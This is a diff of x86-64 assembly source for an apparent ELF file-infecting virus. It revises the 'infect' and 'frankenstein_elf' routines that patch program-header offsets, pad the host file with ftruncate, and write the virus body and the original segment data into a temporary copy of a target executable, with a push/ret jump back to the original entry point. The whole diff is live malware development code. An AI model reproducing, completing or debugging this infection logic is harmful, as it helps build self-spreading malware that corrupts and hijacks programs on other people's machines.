@@ -425,7 +425,8 @@ hostentry_offset: dd 0
 ;hosttext_start: dd 0
 
 intermediary_ptload_segment_offset: dq 0
-next_ptload_segment_offset: dq 0
+next_segment_offset: dq 0
+;next_segment_offset: dd 0
 
 ;data_offset_new_padding: dd 0
 ;data_offset_og: dd 0
@@ -935,11 +936,11 @@ infect:
 					;add dword [r13 + r12 + 40], [PAGESIZE]	;elf_phdr.p_filesz offset
 					;mov dword [data_offset_new_padding],  r11d
 					;mov r10, qword [intermediary_ptload_segment_offset]
-;					mov r10, qword [next_ptload_segment_offset]
+;					mov r10, qword [next_segment_offset]
 ;					cmp r10, 0
 ;					jne .next_phdr
 					;mov qword [intermediary_ptload_segment_offset], r8
-;					mov qword [next_ptload_segment_offset], r11
+;					mov qword [next_segment_offset], r11
 ;					jmp .next_phdr				;this jmp might be unneccessary but adding it for testing
 ;				.mod_other_ptload_phdr:
 ;					xor r11, r11
@@ -952,10 +953,10 @@ infect:
 ;					add dword r11d, [PAGESIZE]
 ;					mov dword [r13 + r12 + 8], r11d				;elf_phdr.p_offset
 ;					;mov r10, qword [intermediary_ptload_segment_offset]
-;					mov r10, qword [next_ptload_segment_offset]
+;					mov r10, qword [next_segment_offset]
 ;					cmp r10, 0
 ;					jne .next_phdr
-;					mov qword [next_ptload_segment_offset], r11
+;					mov qword [next_segment_offset], r11
 ;					;jmp .mod_subsequent_phdr			
 ;					jmp .next_phdr			
 			.mod_subsequent_phdr:
@@ -965,14 +966,16 @@ infect:
 				je .next_phdr
 				mov r10, [r13 + r12 + 8]			;elf_phdr.p_offset  
 				;cmp [r13 + r12 + 8], dword [vxoffset]			;elf_phdr.p_offset  
-				cmp r10d, [vxoffset]
+				;cmp dword r10d, [vxoffset]
+				cmp r10, [evaddr]
 				jl .next_phdr
 				add dword r10d, [PAGESIZE]
-				mov dword [r13 + r12 + 8], r10d				;elf_phdr.p_offset
-				mov r10, qword [next_ptload_segment_offset]
+				mov [r13 + r12 + 8], r10				;elf_phdr.p_offset
+				xor r10, r10
+				mov r10, qword [next_segment_offset]
 				cmp r10, 0
 				jne .next_phdr
-				mov qword [next_ptload_segment_offset], r11
+				mov qword [next_segment_offset], r11
 		.next_phdr:
 			pop rcx
 			dec cx 
@@ -1111,6 +1114,12 @@ frankenstein_elf:
 		mov rax, SYS_WRITE
 		syscall
 
+	; pwrite64(int fd, const void* buf, size_t count, off_t offset)
+	; rdi == fd
+	; rsi == buf
+	; rdx == count 
+	; r10 == offset
+
 	.write_virus_totemp:
 		call .delta
 		.delta:
@@ -1140,27 +1149,39 @@ frankenstein_elf:
 	; by n bytes, where n is a signed integer, passed in rsi
 	;ftruncate grows the file with null bytes, so this will append nec. padding bytes
 	;before we write the original host data segment to the temp file
+	; ftruncate(int fd, offset_t length)
+	; rdi == fd
+	; rsi == length
 	.write_padding_after_vx:
-		xor r10, r10
 		xor r11, r11
-		;mov r11d, dword [PAGESIZE]
-		mov r10d, dword [vxoffset]
-		add r10d, dword vlen				;file offset adjusted to vxoffset+vlen
+		xor rsi, rsi
+		;;;mov esi, r10d
+		;;;add esi, 6
+		;;;xor r10, r10
+		mov r11d, dword [PAGESIZE]
+		;;;mov r10d, dword [vxoffset]
+		;;;add r10d, dword vlen				;file offset adjusted to vxoffset+vlen
 		add r10d, 6							;add 6 bytes for push/ret original entrypoint
-		;;sub r11d, r10d
+		;;;sub r11d, r10d
+		;mov rsi, r10
+		
+		;;;add esi, r11d		
 		
 		;;previous version with shifts
 		;mov dword [vxdatasegment], r10d
-		shr r10d, 12						;divide file offset size by PAGESIZE
+		;;shr r10d, 12						;divide file offset size by PAGESIZE
 		;mov dword [num_pages], r10d			;to calculate the number of pages to pad the file		
-		xor rax, rax
-		mov eax, dword [PAGESIZE]
-		imul r10d
+		;;xor rax, rax
+		;;mov eax, dword [PAGESIZE]
+		;;imul r10d
 		;shl r11d, 1
-		add eax, dword [PAGESIZE] 
-		;add eax, r11d 
-		mov dword [vx_padding_size], eax
-		mov esi, eax
+		;;add eax, dword [PAGESIZE] 
+		;;add eax, r11d 
+		mov esi, dword [next_segment_offset]
+		add esi, r11d 
+		;;mov dword [vx_padding_size], eax
+		mov dword [vx_padding_size], esi
+;		mov esi, eax
 		mov rax, SYS_FTRUNCATE
 		syscall
 ;		jmp .close_temp
@@ -1169,10 +1190,10 @@ frankenstein_elf:
 		xor r10, r10
 		mov rdx, qword [oshoff]
 		;sub edx, dword [intermediary_ptload_segment_offset]
-		sub edx, dword [next_ptload_segment_offset]
+		sub edx, dword [next_segment_offset]
 		lea rsi, [r13]										;r13 contains pointer to mmap'd file
 		;add rsi, qword [intermediary_ptload_segment_offset]	;adjust rsi address to point to PT_LOAD segment 
-		add rsi, qword [next_ptload_segment_offset]	;adjust rsi address to point to PT_LOAD segment 
+		add rsi, qword [next_segment_offset]	;adjust rsi address to point to PT_LOAD segment 
 															;following .text segment in mmap'd original host file
 		mov r10d, dword [vx_padding_size]
 		;mov rax, SYS_PWRITE64
